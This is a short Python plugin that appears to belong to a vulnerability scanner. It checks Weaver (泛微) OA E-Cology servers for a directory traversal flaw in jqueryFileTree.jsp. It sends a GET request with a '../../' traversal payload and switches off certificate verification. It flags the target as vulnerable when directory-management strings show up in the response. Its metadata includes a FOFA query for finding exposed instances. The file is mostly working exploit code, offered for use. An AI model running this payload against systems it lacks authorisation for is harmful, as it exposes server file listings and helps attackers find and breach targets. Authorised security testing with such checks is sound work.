#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/oa/泛微OA/泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微OA E-Cology jqueryFileTree.jsp 目录遍历',

      'level'     :   'medium',

      'FOFA'      :   'app="泛微-协同办公OA"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if "删除目录" in res.text and '重命名目录' in res.text and '新建' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret